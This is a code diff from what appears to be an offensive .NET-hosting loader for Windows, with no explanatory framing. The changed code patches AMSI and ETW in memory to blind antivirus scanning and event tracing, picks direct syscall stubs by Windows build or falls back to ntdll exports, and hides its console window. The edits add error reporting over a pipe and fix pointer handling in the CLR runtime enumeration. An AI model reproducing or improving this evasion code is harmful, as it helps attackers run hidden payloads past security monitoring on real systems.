@@ -445,7 +445,9 @@ VOID Execute(LPVOID lpPayload)
 		AllocConsole();
 		HWND wnd = GetConsoleWindow();
 		if (wnd)
+		{
 			ShowWindow(wnd, SW_HIDE);
+		}
 	}
 
 	HANDLE stdOut = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -457,7 +459,8 @@ VOID Execute(LPVOID lpPayload)
 
 }
 
-INT InlinePatch(LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
+INT InlinePatch(HANDLE pipe, LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
+#ifdef USE_SYSCALLS
 	PTEB pTEB = NULL;
 	PPEB pPEB = NULL;
 
@@ -498,6 +501,9 @@ INT InlinePatch(LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
 		case 19045: // 22H2
 		    ZwProtectVirtualMemory = &ZwProtectVirtualMemory10_4;
 			break;
+		default:
+		    ReportErrorThroughPipe(pipe, "[CLRHOST] Unknown Windows Version: %d\n", pPEB->OSBuildNumber);
+			return -1;
 		}
 		
 #endif
@@ -519,6 +525,11 @@ INT InlinePatch(LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
 
 		return -2;
 	}
+#else
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+	ZwProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
+	ZwWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+#endif
 
 	LPVOID lpBaseAddress = lpFuncAddress;
 	ULONG OldProtection, NewProtection;
@@ -556,7 +567,7 @@ BOOL PatchEtw(HANDLE pipe)
 		return -2;
 	}
 
-	return InlinePatch(lpFuncAddress, uHook, sizeof(uHook));
+	return InlinePatch(pipe, lpFuncAddress, uHook, sizeof(uHook));
 }
 
 BOOL PatchAmsi(HANDLE pipe)
@@ -576,7 +587,7 @@ BOOL PatchAmsi(HANDLE pipe)
 		return -2;
 	}
 
-	return InlinePatch(addr, amsipatch, sizeof(amsipatch));
+	return InlinePatch(pipe, addr, amsipatch, sizeof(amsipatch));
 }
 
 BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID* pRuntimeInfo) {
@@ -586,9 +597,9 @@ BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID* pRuntimeInf
 	BOOL retval = FALSE;
 	wchar_t currentversion[260];
 
-	while (SUCCEEDED(pEnumerator->Next(1, (IUnknown**)&pRuntimeInfo, &fetched)) && fetched > 0)
+	while (SUCCEEDED(pEnumerator->Next(1, (IUnknown**)pRuntimeInfo, &fetched)) && fetched > 0)
 	{
-		hr = ((ICLRRuntimeInfo*)pRuntimeInfo)->GetVersionString(currentversion, &vbSize);
+		hr = ((ICLRRuntimeInfo*)*pRuntimeInfo)->GetVersionString(currentversion, &vbSize);
 		if (!FAILED(hr))
 		{
 			if (wcscmp(currentversion, version) == 0)
@@ -597,7 +608,7 @@ BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID* pRuntimeInf
 				break;
 			}
 		}
-		((ICLRRuntimeInfo*)pRuntimeInfo)->Release();
+		((ICLRRuntimeInfo*)*pRuntimeInfo)->Release();
 	}
 
 	return retval;
